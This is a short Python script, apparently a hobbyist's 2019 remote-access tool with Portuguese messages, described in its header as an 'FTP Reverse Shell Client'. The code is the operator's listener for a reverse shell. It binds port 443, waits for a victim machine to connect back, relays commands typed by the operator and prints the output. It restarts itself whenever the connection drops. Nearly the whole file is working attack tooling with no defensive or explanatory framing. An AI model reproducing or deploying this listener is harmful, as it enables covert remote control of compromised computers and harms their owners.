import socket
from time import sleep
import os

# Al0nnso - 2019
# FTP Reverse Shell Client
# NOT TESTED WITH EXTERN NETWORK

host = ''# No need to edit this
port = 443# Change if you want
print('FTP')

def criarSocket():
    try:
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = socket.socket()
        s.bind((host, port))
        s.listen(1)
        print('[+] Aguardando conexao :) .')
        recvConnection(s)
    except:
        print('[-] Falha criando em 30 segundos.')
        s.close()
        sleep(30)
        criarSocket()


def recvConnection(s):
    conn, endereco = s.accept()
    print('[+] Conexao com: ' + endereco[0] + ':' + str(endereco[1]))
    sendCommands(conn)


def sendCommands(conn):
    dot='Comando ~> '
    while True:
        try:
            try:
                resposta = conn.recv(3000)#.decode()
            except:
                print('crio errado porra')
            try:
                print(str(resposta.decode('utf8', 'ignore')))
            except:
                print('nao printo inhaaa')
            #print(resposta.decode())
            try:
                comando = input(dot)
                if len(comando) > 0:
                    conn.send(comando.encode())
                    #resposta = conn.recv(1024)
                    print(str(resposta.decode('utf8', 'ignore')))
                else:
                    conn.send(' '.encode())
            except Exception as e:
                print(e)
                print('deu ruim mermao')

        except Exception as e:
            print('[-] Conexao perdida reiniciando....')
            conn.close()
            criarSocket()


criarSocket()